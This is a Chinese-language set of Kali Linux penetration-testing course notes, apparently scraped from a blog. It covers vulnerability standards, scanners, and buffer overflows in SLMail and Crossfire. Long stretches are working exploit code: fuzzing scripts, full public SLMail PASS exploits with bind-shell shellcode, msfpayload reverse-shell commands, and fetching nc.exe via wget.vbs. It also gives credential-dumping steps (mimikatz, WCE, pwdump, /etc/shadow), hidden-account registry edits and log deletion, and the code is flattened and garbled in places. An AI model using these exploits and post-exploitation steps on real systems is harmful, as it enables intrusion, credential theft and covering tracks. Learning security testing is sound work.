CAN负责制定CVE ID 发布到CVE List —– CVE-2008-4250 MITRE 负责对内容进行编辑维护 很多厂商维护自己的Vulnerability Refernce MS MSKB 其他Vulnerability Reference CERT TA08-297A BID 31874 IAVM 2008-A-0081 OVAL OVAL6093 OVAL(Open Vulenrabilty and Assessment Language) 描述漏洞检测方法的机器可识别语言 详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施 OVAL使用XML语言描述,包含了严密的语言逻辑 CCE 描述软件配置缺陷的一种标注化格式 在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可以让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作 CPE(Common Product Enumernation) 信息技术产品,系统,软件包的结构化命名规范,分类命名 CWE(Common Weakness Enumeration) 常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务) Security Content Automation Protocal(SCAP) SCAP 是一个集合了多种安全标准框架 6个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF 目的是以标准的方法展示和操作安全数据 由NIST负责维护 SCAP主要解决三个问题 实现高层政策法规等到底层实施的落地(如FISMA,ISO2700系列) 将信息安全所设计的各个要素标准化(如统一漏洞命以及严重性度量) 将复杂的系统配置核查工作自动化 SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响 NVD(National Vulnerabilty Database) 美国政府的漏洞管理标准数据 完全基于SCAP框架 实现自动化漏洞管理 包含一下库 安全检查列表 软件安全漏洞 配置错误 产品名称 影响度量漏洞管理 周期性扫描跟踪漏洞 高危漏洞优先处理 扫描注意事项 漏洞管理三要素 准确性sssss9 时间 资源NMAP nmap 扫描脚本 400+ 分类 cat /usr/share/nmap/scripts/script.db grep vuln /usr/share/nmap/scripts/script.db | cut -d “&quot; -f 2 cat /usr/share/nmap/scripts/smb-check-vulns.nse smb-check-vulns.nse nmap -sU –script=smb-check-vulns.nse –script-args=unsafe=1 -p U:137,139,445 1.1.1.1 MS08-067 smb-vuln-ms 10-061.nse Stuxnet蠕虫利用的4个漏洞之一 Print Spooler权限不当 打印请求可在系统目录可创建文件,执行任意代码 LANMAN API 枚举共享打印机 远程共享打印机名称 smb-enum-shares枚举共享 身份认证参数-smbuser,smbpassword nmap -p445 –script=smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass 1.1.1.1 Windows XP,Server 2003 SP2,Vista,Server 2008,win7 影响扫描结果的因素弱点扫描器-OPENVAS Openvas Nessus项目分支 管理目标系统的漏洞 免费开源 kali默认安装.但未配置和启动 早期Openvas配置 安装 创建证书 同步弱点数据库 重建数据库 备份数据库 启动服务装入插件 创建管理员账号 创建普通用户账号 配置服务侦听端口 安装验证 Openvas组件 OpenVAS Manager 控制scanner和其他manager的中心组件 控制中心数据库,保存用户配置及扫描结果 客户端使用基于XML的无状态OMP协议与通信 集中排序筛选,使客户端获得一致展现 OpenScanner 具体执行Network Vulnerability Tests(NVTs) NVTs 每天通过Feed更新 受Manager控制 OSP Scanner 可以统一管理多个scanner 将一组scanner作为一个对象交给manager Greebone Security Assistant(GSA) 提供Web Service OpenVAS CLI omp命令行工具,可实现批处理控制manager 更新很快 所有找到的资料集合都已不同程度的过时了 现在安装Openvas 初始化安装 openvas-setup 检查安装结果 openvas-check-setup 查看当前账号 openvasmd –list-users 修改账号密码 openvasmd –user=admin-new -password=password 升级 openvas-feed-update 扫描配置 扫描windows 扫描LInux 扫描网络设备 扫描任务 进度 报告 小结 不是秘笈而是经验 vi /usr/bin/openvas-startNESSUS 家庭版 免费 专业版 收费,无限的并发连接 下载 http://www.tenable.com/products/nessus/select-your-operating-system 安装 dpkg -i 安装路径: /opt/nessus 启动服务 /etc/init.d/nessusd start 策略 扫描 扫描主机 扫描windows 扫描linux 扫描网络设备 扫描 web server 报告 调度NEXPOSE Rapid 7 Nexpose 完整的漏洞管理实现 环境准备 建立 VM 4G 内存 http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova https://IP_addr:3780 (nxdmin/nxpassword) 操作系统账号密码:nexpose http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp K3LQ-5PPS-RTS5-LTS5(14天后到期) Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出 程序漏洞从哪里来? 罪恶的根源:变量 数据与代码边界不清(注入攻击) 最简漏洞原理-shell 脚本漏洞(本质:输入数据本身,程序本身没做检查导致)缓冲区溢出 当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”称暴”,从而覆盖了相邻内存区域的数据 成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务控制权等后果’如何发现漏洞? 源码审计 逆向工程 模糊测试 向程序堆栈半随机的数据,根据内存变化判断溢出 数据生成器,生成随机,半随机数据 测试工具,识别溢出漏洞(动态调试工具:IDA,OD)Windows系统缓冲区溢出 FUZZING(模糊测试) 准备环境 SLMail 5.5.0 Mail Server immunityDebugger_1_85_setup.exe mona.py POP3 PASS 命令存在缓冲区溢出漏洞 无需身份验证实现远程代码执行 windows防护机制 DEP:阻止代码从数据页被执行(软硬件实现) ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化 POP3 NC 110 端口 了解未知协议 Wireshark RFC 01.py123456789101112131415161718192021 #!/bin/python import socket s=socket(socket.AF_INET,socket.SOCK_STREM) try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;1.1.1.1&apos;,110)) data=s.recv(1024) print data s.send(&apos;USER xxx&apos;+&apos;\r\n&apos;) data=s.recv(1024) print data s.send(&apos;PASS test\r\n&apos;) data=s.recv(1024) print data s.close() print &quot;\nDone!&quot;except: print &quot;Could not connext to POP3!&quot; FUZZING(way 1) 测试PASS 命令收到大量数据时是否发生溢出 EIP寄存器存放下一条指令的地址 02.py1234567891011121314151617#!/usr/bin/pythonimport socket buffer=[&quot;A&quot;]counter=100while len(buffer)&lt;=50: buffer.append(&quot;A&quot;*counter) counter=counter+200for string in buffer: print &quot;Fuzzing PASS with %s bytes&quot; % len(string) s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect=s.connect((&apos;1.1.1.1.1&apos;,110)) s.recv(1024) s.send(&apos;USER test&apos;+&apos;\r\n&apos;) s.recv(1024) s.send(&apos;PASS&apos;+string+&apos;\r\n&apos;) s.send(&apos;QUIT\r\n&apos;) s.close() FUZZING(way 2) 2700个字符实现EIP溢出 03.py 1234567891011import socket s=soket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer=&apos;A&apos;*2600(不断改变数字)try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;1.1.1.1&apos;,110)) data=s.recv(1024) s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;) print &apos;\nDone!&apos;except: print &quot;Could not connect to POP3!&quot; 找到精确溢出的4个字节 二分法(2700-&gt;2600-&gt;2650) 唯一字串法 kali生成唯一字符串:/sur/share/metasploit/tools/pattern_ create.rb 2700 04.py 05.py 思路: 将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,并跳转到shellcode代码段执行 寻找可存放的内存地址空间 06.py 1234567891011121314#!/usr/bin/pythonimport sockets=socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer=&quot;A&quot;*2606+&quot;B&quot;*4+C*(3500-2606-4) # 假设EXP寄存器最大可存放3500个字符try: print &quot;\nSending ing evil buffer...&quot; s.connect((&apos;1.1.1.1&apos;,110)) date=s.recv(1024) s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;) date=s.recv(1024) s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)\]]]]]]]][[][][][][][][][][ ]] print &quot;\nDone!&quot;except: print &quot;Could not connect to POP3!&quot; FUZZING: 不同类型的程序.协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途 返回地址,shellcode,buffer中都不能出现坏字符 null (0x00) 空字符,用于终止字符串的拷贝操作 return (0x0D) 回车操作,表示POP3 PASS 命令输入完成 思路:- 发送0x00-0xff 256个字符,查找所有坏字符 07.py 坏字符:0x0A,0x00,0x0D123456789101112131415#!/usr]]bin/pythonimport sockets=socket.socket(socket.AF_INET,socket.SOCK_STREAM)badchars=从0x00-0xffbuffer=&quot;A&quot;*2606+&quot;B&quot;*4+badchars try: print &quot;\nSending ing evil buffer...&quot; s.connect((&apos;1.1.1.1&apos;,110)) date=s.recv(1024) s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;) date=s.recv(1024) s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;) print &quot;\nDone!&quot;except: print &quot;Could not connect to POP3!&quot; FUZZING: 重定向数据流 用ESP的地址替换EIP的值 但是ESP地址变化,硬编码不可行 SLMail 线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定 变通思路: 在内存中寻找地址固定的系统模块 在模块中寻找JMP ESP指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块 寻找无EDP,ASLR保护的内存地址 内存地址不包含坏字符 mona find -s “二进制地址(可使用16进制转换工具)” -m xxx.dll 生成shellcode Scratch ./msfpayload -l ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 -C ./msfpayload win32_reverse LHOST=10.0.2.15 444 R | ./msfencode -b “\x00\x0a\x0d” nc -vlp 443 09.py \x90:nop指令 防止shellcode被清除前几个字节 提权侵入,拿shell shellcode执行结束后以exit方式退出整个结束,将导致邮件服务崩溃 Smail是一个基于线程的应用,使用ExitThread方式可避免整个服务崩溃,可实现重复溢出 FUZZING:远程桌面操控受控机 windows:配置信息在注册表 RegSnap 工具 提权后远程操控指令: Linux缓冲区溢出 - - 穿越火线缓冲区溢出 1.环境搭建: Crossfire(穿越火线) 多人在线RPG游戏 1.9.0版本接受入站 scoket连接时存在缓冲区溢出漏洞 调试工具 edb 运行平台 Kali i486 虚拟机 2.Fuzzing 新版本Linux内核会支持内存保护机制 DEP ASLR 堆栈 cookies 堆栈粉碎 本机调试 ipatbles -A INPUT -p tcp –destination-port 4444 ! -d 127.0.0.1 -j DROP ipatbles -A INPUT -p tcp –destination-port 13327 ! -d 127.0.0.1 -j DROP 1.01.py12345678910111213141516#!/usr/bin/pythonimport sockethost=&quot;127.0.0.1&quot;#\x41 代表A 精确溢出crash=&quot;\x41&quot;*4379 # \x11 设备操作指令 \x90 NOP指令buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;# 建立连接s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)print &quot;[*] Sending evil buffer...&quot;s.connect((host,13327))data=s.recv(1024)print datas.send(buffer)s.close()print &quot;[*]Payload Sent!&quot; 2.唯一字符串识别EIP精确位置 02.py12345678910111213141516#!/usr/bin/pythonimport sockethost=&quot;127.0.0.1&quot;#\x41 代表A 精确溢出crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7 # \x11 设备操作指令 \x90 NOP指令buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;# 建立连接s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)print &quot;[*] Sending evil buffer...&quot;s.connect((host,13327))data=s.recv(1024)print datas.send(buffer)s.close()print &quot;[*]Payload Sent!&quot; 3.思路:shellcode代码置入 第一阶段shellcode ESP 跳转到 EAX 偏移12个字节 setup sound shellcode2 nasm add eax,12 jmp eax 查找坏字符 \x00\x0a\0x0d\x20 5.shellcode ESP跳转地址 跳转该过程: EIP-&gt;jmp esp-&gt;add eax 12-&gt;jmp eax 使用msfpayload 生成shellcode 选择和修改EXP 网上公开的EXP代码 选择可信赖的EXP源(虚拟环境中验证) Exploit-db SecurityFocus(安全焦点) Searchsploit 有能力修改EXP(Python,Perl,Ruby,C,C++…) 选择和修改EXP 646.C 类unix环境下编译 返回地址与本机环境不符 反弹shell硬编码回连IP地址 缓冲区偏移量与环境不符 目标IP硬编码123456//646.c SLMAIL REMOTE PASSWD BO 代码// 需使用gcc进行编译 #include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt;#include &lt;windows.h&gt; // [*] bind 4444unsigned char shellcode[] =“\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45”“\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49”“\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d”“\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66”“\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61”“\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40”“\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32”“\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6”“\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09”“\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0”“\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff”“\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53”“\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff”“\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64”“\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89”“\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab”“\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51”“\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53”“\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6”“\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0”; 1``` void exploit(int sock) { FILE test; int *ptr; char userbuf[] = “USER madivan\r\n”; char evil[3001]; char buf[3012]; char receive[1024]; char nopsled[] = “\x90\x90\x90\x90\x90\x90\x90\x90” “\x90\x90\x90\x90\x90\x90\x90\x90”; memset(buf, 0x00, 3012); memset(evil, 0x00, 3001); memset(evil, 0x43, 3000); ptr = &evil; ptr = ptr + 652; // 2608 memcpy(ptr, &amp;nopsled, 16); ptr = ptr + 4; memcpy(ptr, &amp;shellcode, 317); *(long)&amp;evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP // banner recv(sock, receive, 200, 0); printf(&quot;[+] %s&quot;, receive); // user printf(&quot;[+] Sending Username...\n&quot;); send(sock, userbuf, strlen(userbuf), 0); recv(sock, receive, 200, 0); printf(&quot;[+] %s&quot;, receive); // passwd printf(&quot;[+] Sending Evil buffer...\n&quot;); sprintf(buf, &quot;PASS %s\r\n&quot;, evil); //test = fopen(&quot;test.txt&quot;, &quot;w&quot;); //fprintf(test, &quot;%s&quot;, buf); //fclose(test); send(sock, buf, strlen(buf), 0); printf(&quot;[*] Done! Connect to the host on port 4444...\n\n&quot;);} 1234567891011121314151617181920212223242526272829303132```int connect_target(char *host, u_short port)&#123; int sock = 0; struct hostent *hp; WSADATA wsa; struct sockaddr_in sa; WSAStartup(MAKEWORD(2,0), &amp;wsa); memset(&amp;sa, 0, sizeof(sa)); hp = gethostbyname(host); if (hp == NULL) &#123; printf(&quot;gethostbyname() error!\n&quot;); exit(0); &#125; printf(&quot;[+] Connecting to %s\n&quot;, host); sa.sin_family = AF_INET; sa.sin_port = htons(port); sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list); sock = socket(AF_INET, SOCK_STREAM, 0); if (sock &lt; 0) &#123; printf(&quot;[-] socket blah?\n&quot;); exit(0); &#125; if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0) &#123;printf(&quot;[-] connect() blah!\n&quot;); exit(0); &#125; printf(&quot;[+] Connected to %s\n&quot;, host); return sock;&#125; 12345678910111213int main(int argc, char **argv)&#123; int sock = 0; int data, port; printf(&quot;\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n&quot;); printf(&quot;[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n&quot;); if ( argc &lt; 2 ) &#123; printf(&quot;usage: slmail-ex.exe &lt;host&gt; \n\n&quot;); exit(0); &#125; port = 110; sock = connect_target(argv[1], port); exploit(sock); closesocket(sock); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# 638.py POP3 PASS 缓冲区溢出代码import structimport socketprint &quot;\n\n###############################################&quot;print &quot;\nSLmail 5.5 POP3 PASS Buffer Overflow&quot;print &quot;\nFound &amp; coded by muts [at] offsec.com&quot;print &quot;\nFor Educational Purposes Only!&quot; print &quot;\n\n###############################################&quot;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sc = &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66&quot;sc += &quot;\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6&quot;sc += &quot;\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa&quot;sc += &quot;\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f&quot;sc += &quot;\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb&quot;sc += &quot;\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba&quot;sc += &quot;\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb&quot;sc += &quot;\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc&quot;sc += &quot;\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61&quot;sc += &quot;\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70&quot;sc += &quot;\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44&quot;sc += &quot;\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7&quot;sc += &quot;\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69&quot;sc += &quot;\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9&quot;sc += &quot;\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0&quot;sc += &quot;\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3&quot;sc += &quot;\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7&quot;sc += &quot;\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0&quot;sc += &quot;\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67&quot;sc += &quot;\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1&quot;sc += &quot;\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0&quot;sc += &quot;\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88&quot;sc += &quot;\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d&quot;sc += &quot;\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95&quot;sc += &quot;\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2&quot;#Tested on Win2k SP4 Unpatched# Change ret address if neededbuffer = &apos;\x41&apos; * 4654 + struct.pack(&apos;&lt;L&apos;, 0x783d6ddf) + &apos;\x90&apos;*32 + sc try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.1.167&apos;,110)) data = s.recv(1024) s.send(&apos;USER username&apos; +&apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) data = s.recv(1024) s.close() print &quot;\nDone! Try connecting to port 4444 on victim machine.&quot;except: print &quot;Could not connect to POP3!&quot; 避免有害的EXP 不同的EXP 不同的系统补丁 软件版本 不同的offset,shellcode 扫描探测目标系统版本,搭建适当的测试环境 避免一锤子测试 修改公开的EXP满足不同的环境需要 了解漏洞原理,修改溢出代码后漏洞利用阶段(POST EXPLOITATION) 1.漏洞利用后阶段 上传工具 提取 擦除攻击痕迹 安装后门(木马程序) 长期控制 Dump密码 内网渗透(拿到更多服务器) 后漏洞利用阶段 最大的挑战-防病毒软件 使用合法的远程控制软件(nc) 2.上传工具之上传文件 持久控制 扩大对目标系统的控制能力 Linux系统 netcat curl wget windos系统 缺少预装的下载工具 一些问题解决方案: a.非交互式模式shell(具有局限性,需上传木马拿到交互式shell) 类nc 远程控制shell ftp 192.168.1.1 上传文件的方法 使用TFTP传输文件 xp,2003默认安装 win7,2008需要单独添加 经常被边界防火墙过滤 使用FTP传输文件 apt-get install pure-ftpd ftp.sh 使用 VBSCRIPT 传输文件 wget.vbs cscript wget.vbs.http://192.168.1.117/nc.exe nc.exe 使用POWERSHELL 传输文件 Wget.ps1 使用DEBUG 传输文件 Debug 汇编,反汇编 16进制dump工具 64k字节 upx压缩文件 wine exe2bat.exe nc.exe nx.hex debug&lt;nc.hex copy 1.dll nc.exe Kali Linux 从入门到精通(十一)–提权 本地提权 已实现本地低权限账号登录 远程溢出 直接获得账号密码 希望获取更高权限 实现对目标进一步控制 系统之间权限隔离 操作系统安全的基础 用户空间 内核空间 系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登陆已在后台启动服务 Windows user Administrator System:实质最大权限账号 注:非包含关系,交集 Linux User Root:相当于Administrator和SystemWindows 系统提权之—-ADMIN–提取为SYSTEM Windos账号 系统设置管理功能 Sysinternal Suit https://technet.microsoft.com/en-us/sysinternals psexec -i -s -d taskmgr at 19:39 /interactive cmd sc Create syscmd binPath=”cmd /K start” type=own type=”interact” sc start syscmd(系统默认以SYSTEM方式启动服务) 注入进程提权 隐藏痕迹 pinjector.exe http://www.tarasco.org/security/Process_injector/抓包嗅探 Windows Wireshark Omnipeek:Windows抓包工具,界面友好 commview Sniffpass (基于抓包密码抓取数据) Linux Tcpdump Wireshark Dsniff (抓取密码)键盘登录 Keylogger 木马窃取本地缓存密码 浏览器缓存的密码 IE浏览器 Firefox 网络密码 无线密码 http://www.nirsoft.net Dump SAM(数据库) Pwdump(从windows的SAM中读取密文) /usr/share/windows-binaried/fgdump/ 生成PWDUMP 文件 使用ophcrack(密码破解工具) 进行爆破 Windows 身份认证过程WCE(WINDOWS CREDENTIAL EDITOR)&lt;======工具(win7之前) /usr/share/wce/ 需要管理员权限 wce-universal.exe -l / -lv wce-universal.exe -d wce-universal.exe -e / -r wce-universal.exe -g wce-universal.exe -w LM/NT bash 从内存读取LM/NLTM hash Digest AAUTHENTICATION Package NLTM Security Package Kerberos Security Package 防止WCE攻击 其他工具 pwdump localhost fgdump mimikatz privilege::debug # 提升权限 sekulsa::logonPasswords利用漏洞提权 MS 11-80 漏洞 ( 单机漏洞提取) Ms 11-080 (11 年第80个漏洞)—&gt; 中文版本会产生dos(拒绝服务攻击) Kb2592799 https://technet.microsoft.com/library/security/ms11-080 Pyinstaller Pywin32 MS11-046 DoS MS14-068 漏洞 (获得域的管理员权限 操控多台计算机) 库 http://github.com/bidord/pykel ms14-068.py -u user@lab.com -s userSID -d dc.lab.com 拷贝 TGT_user1@ lab.com cache到windos系统 本地管理员登录 mimkatz.exe CVE-2012-0056 (Linux OS 漏洞) /proc/pid/mem (进程权限控制不严格) kernels&gt;2.6.39 http://blog.zx2c4.com/749 利用配置不当提权 与漏洞提取相比 更常用的方法 企业环境 补丁更新的全部已经安装 输入变量过滤之外更值得研发关注的安全隐患 以system的权限启动 NTFS权限允许users修改删除 icals icals c:\windows*.exe /save perm /T Find find / -perm 777 -execls -l {} ; 应用系统的配置文件 应用连接数据库的配置文件 后台服务运行账号基本信息收集 Linux /etc/resolv.conf /etc/passwd /etc/shadow (保存有密码) whoami,who -a ifconfig -a iptables -L -n,netstat -rn uname -a,ps aux dpkg -l | head Windows ipconfig / all, ipconfig/displaydns netstat -bnao,netstat -r net view,netview /domain net user/domain net accounts,net share net localgroup administarators username /add net group “Domain Controlleds” /domain WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)&lt;—强大功能 wmic nicconfig get ipaddress,nacadess wmic computersystem get username收集敏感信息 商业信息 系统信息 Linux /etc ; /usr/local/etc /etc/pass ; /etc/shadow .ssh ; .gnupg 公私钥 The e-mail and data file 业务数据库 ; 身份认证服务器数据库 /tmp Windows SAM 数据库 ; 注册表文件 %SYSTEMROOT%\repair\SAM (存放SAM副本) %SYSTEMROOTS%\System32\config\RegBack\SAM (存放SAM副本) 业务数据库 ; 身份认证数据库 临时文件目录隐藏痕迹 禁止在登录界面显示新建账号 REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windoes NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /TREG_SWORD/D 0 (隐藏账号) del %WINDIR%*.log /a/s/q/f History 日志 auth.log / secure btmp / wtmp lastlog / faillog 其他日志和HIDS等 Kali Linux 从入门到精通(十一)–无线渗透测试 1.无线渗透概述 与其他章节独立,涵盖面广,可独立成课 无线技术变化块,难度大 既新鲜刺激 难度大 不会研究很深 半理论,半实践 理论是本章最有价值的部分(aircrack-ng suite 作者写的一本书) 无线技术是本课程难度最大的一章 协议结构2.无线技术特点 行业迅猛发展 互联网的重要入口 边界模糊 安全实施缺失而且困难 对技术不了解而造成配置不当 企业网络私自接入AP破坏网络边界3.IEEE:Institute of Elecrical and Electronics Engineers IEEE分为不同的技术委员会,其中802委员会负责lan,man的制定 以太网 令牌环网 无线局域网 网桥4.无线(802.11) 数据链路层 LLC MAC 物理层 IEEE 802.11 标准图片1图片4802.11b802.11A802.11G 无线图片2 日常使用图片35.无线网络运行模式 无线网络架构 (两种半方式) a. Infrasture (基础架构型) AP 维护SSID(服务级标识符–即无线名) 至少包含一个AP和一个STATION,形成一个Basic Service Set(BSS) 基本服务集 AP连接到有线网络,称为Distribution System(DS) 连接到同一个DS的多个AP形成一个Extended Service Set(ESS) b. Ad-Hoc STA 维护SSID 也被称为Independent Basic Service Set(IBSS) 有至少两个STAs直接通信组成 也称为peer to peer模式 其中一个STA负责AP的工作 通过beacon广播SSID 对其他STAs进行直接身份验证 Service Set Identifier(SSID)- AP每秒钟约10次通过Beacon帧广播SSID - 客户端连接到无线网络后也会宣告SSID WIRELESS DISTRIBUTION SYSTEM(WDS) 与有限DS类似,只是通过无线连接的多个AP组成的网络 Bindging(桥接方式)-只有AP间彼此通信 Repeating(中继方式)-只允许所有AP和STA进行通信 c.MONITOR MODE(类似于有线网络的混杂模式,可抓住其他机器的流量) Monitor 不是一种真的无线模式 但是对无线渗透至关重要 允许无线网卡没有任何筛选的抓包(802.11包头) 与有线网络的混杂模式可以类比 审核的网卡和驱动不但可以monitor,更可以Injection 6.无线网络硬件设备及基本概念 物理机运行kali 虚拟机运行kali 外置USB 无线网卡 TL-WN722N(个人建议) dmseg iwconfig 7.选择无线网卡 这是个痛苦和受挫的过程 无线网卡的芯片和型号是成败的关键 台式机: USB 无线卡 (不支持扩展天线) PCMCIA(16 bit 已停产) Cardbus(32 bit PCMCIA 8.0标准) Express Cards MiniPCI MiniPCI Express 发送功率:远程连接 接收灵敏:适当降低灵敏度,接收效果更佳 经验但不是铁律 或 Realtek 芯片 没有神器 兼容 aircrack-ng suite http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters 无线渗透网卡没有所谓标准,但是Aircrack-ng suite 作者给出建议 Alfa Networks AWUS036H 无线网卡8.无线技术概念 9.Linux无线协议栈及配置命令 10.RADIOTAP头]]></content>
      <categories>
        <category>信息安全</category>
        <category>渗透测试</category>
        <category>Kali Linux大法</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
</search>
